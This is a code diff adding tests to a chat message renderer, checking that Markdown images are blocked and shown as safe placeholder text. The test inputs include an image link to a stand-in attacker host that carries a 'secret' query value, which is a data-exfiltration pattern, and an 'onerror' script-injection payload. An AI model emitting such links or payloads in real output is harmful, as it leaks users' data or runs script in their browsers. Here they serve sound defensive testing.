@@ -33,6 +33,18 @@ describe("chat message rendering", () => {
     expect(html).toContain('rel="noopener noreferrer"');
   });
 
+  it.each([
+    ["![](https://evil.example/collect?d=secret)", "[image blocked]"],
+    ["![private diagram](//evil.example/p.png)", "[image blocked: private diagram]"],
+    ['![<img src=x onerror=alert(1)> & private](https://evil.example/p.png)', "[image blocked: &lt;img src=x onerror=alert(1)&gt; &amp; private]"],
+  ])("blocks Markdown image requests and renders safe placeholder text: %s", (content, placeholder) => {
+    const html = render(content);
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("evil.example");
+    expect(html).not.toContain('rel="preload"');
+    expect(html).toBe(`<p><span>${placeholder}</span></p>`);
+  });
+
   it("tolerates every streaming prefix, incomplete math, and invalid LaTeX", () => {
     const message = '### Title\n\n**Bold** $x^2$\n\n$$\n\\frac{1}{2}\n$$\n\n```ts\nconst x = 1;\n```';
     for (let end = 0; end <= message.length; end++) {
